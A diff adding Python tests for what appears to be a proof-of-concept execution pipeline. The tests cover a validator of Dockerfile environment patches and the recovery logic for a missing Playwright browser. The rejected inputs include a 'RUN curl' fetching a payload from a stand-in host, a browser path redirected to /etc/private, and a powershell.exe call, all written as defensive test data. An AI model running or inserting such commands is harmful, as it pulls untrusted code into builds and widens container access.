@@ -164,6 +164,11 @@ async def test_valid_environment_rebuild_is_stored_as_exact_artifact(
         "RUN python -m pip install pytest && powershell.exe",
         "RUN python -m pip install pytest > /tmp/output",
         "RUN echo unbounded-command",
+        "ENV PLAYWRIGHT_BROWSERS_PATH=/etc/private\n"
+        "RUN python -m playwright install --with-deps chromium",
+        "ENV PLAYWRIGHT_BROWSERS_PATH=/opt/sastsimi-playwright-browsers\n"
+        "RUN python -m playwright install --with-deps chromium\n"
+        "RUN curl https://example.invalid/payload",
     ],
 )
 def test_environment_patch_rejects_authority_expansion(patch: str) -> None:
@@ -184,6 +189,129 @@ def test_environment_patch_rejects_authority_expansion(patch: str) -> None:
 )
 def test_environment_patch_accepts_allowlisted_package_commands(patch: str) -> None:
     assert validate_environment_patch(f"\n{patch}\n") == patch
+
+
+@pytest.mark.asyncio
+async def test_missing_python_playwright_browser_rebuilds_only_the_container_image(
+    tmp_path: Path,
+) -> None:
+    checkpoint = _running_checkpoint()
+    artifacts = SimpleArtifactRepository(tmp_path, checkpoint.identity)
+    stderr_ref = artifacts.put_bytes(
+        b"BrowserType.launch: Executable doesn't exist at "
+        b"/.cache/ms-playwright/chromium_headless_shell-1194/chrome-linux/headless",
+        "text/plain",
+    )
+    execution_ref = artifacts.put_json(
+        {
+            "kind": "simple_poc_execution",
+            "stderr_ref": stderr_ref.model_dump(mode="json"),
+        }
+    )
+    client = DecisionClient(
+        {
+            "category": "TERMINAL",
+            "action": "STOP",
+            "diagnosis": "missing browser",
+            "guidance": "manual review",
+            "environment_patch": "",
+        }
+    )
+
+    result = await SimpleRecoveryCoordinator(
+        client=client,
+        artifacts=artifacts,
+    ).decide(
+        checkpoint,
+        StageFailure(
+            code="POC_EXECUTION_FAILED",
+            retryable=True,
+            safe_message="PoC execution failed",
+            evidence_refs=(execution_ref, stderr_ref),
+        ),
+    )
+
+    assert result.decision.category is RecoveryCategory.ENVIRONMENT
+    assert result.decision.action is RecoveryAction.REBUILD_ENVIRONMENT
+    assert result.decision.environment_patch == (
+        "ENV PLAYWRIGHT_BROWSERS_PATH=/opt/sastsimi-playwright-browsers\n"
+        "RUN python -m playwright install --with-deps chromium"
+    )
+    assert validate_environment_patch(result.decision.environment_patch) == (
+        result.decision.environment_patch
+    )
+    assert client.calls == 0
+
+
+@pytest.mark.asyncio
+async def test_browser_error_text_without_execution_record_does_not_force_rebuild(
+    tmp_path: Path,
+) -> None:
+    checkpoint = _running_checkpoint()
+    artifacts = SimpleArtifactRepository(tmp_path, checkpoint.identity)
+    unrelated_ref = artifacts.put_bytes(
+        b"BrowserType.launch: Executable doesn't exist at "
+        b"/.cache/ms-playwright/chromium_headless_shell-1194/chrome-linux/headless",
+        "text/plain",
+    )
+    client = DecisionClient(
+        {
+            "category": "TERMINAL",
+            "action": "STOP",
+            "diagnosis": "not verified as execution stderr",
+            "guidance": "manual review",
+            "environment_patch": "",
+        }
+    )
+
+    result = await SimpleRecoveryCoordinator(
+        client=client,
+        artifacts=artifacts,
+    ).decide(
+        checkpoint,
+        StageFailure(
+            code="POC_EXECUTION_FAILED",
+            retryable=True,
+            safe_message="PoC execution failed",
+            evidence_refs=(unrelated_ref,),
+        ),
+    )
+
+    assert result.decision.action is RecoveryAction.STOP
+    assert client.calls == 1
+
+
+@pytest.mark.asyncio
+async def test_malformed_execution_stderr_reference_does_not_crash_recovery(
+    tmp_path: Path,
+) -> None:
+    checkpoint = _running_checkpoint()
+    artifacts = SimpleArtifactRepository(tmp_path, checkpoint.identity)
+    malformed_ref = artifacts.put_json(
+        {"kind": "simple_poc_execution", "stderr_ref": {"invalid": True}}
+    )
+    client = DecisionClient(
+        {
+            "category": "TERMINAL",
+            "action": "STOP",
+            "diagnosis": "untrusted execution metadata",
+            "guidance": "manual review",
+            "environment_patch": "",
+        }
+    )
+
+    result = await SimpleRecoveryCoordinator(client=client, artifacts=artifacts).decide(
+        checkpoint,
+        StageFailure(
+            code="POC_EXECUTION_FAILED",
+            retryable=True,
+            safe_message="PoC execution failed",
+            evidence_refs=(malformed_ref,),
+        ),
+    )
+
+    assert result.decision.action is RecoveryAction.STOP
+    assert client.calls == 1
 
 
 @pytest.mark.asyncio
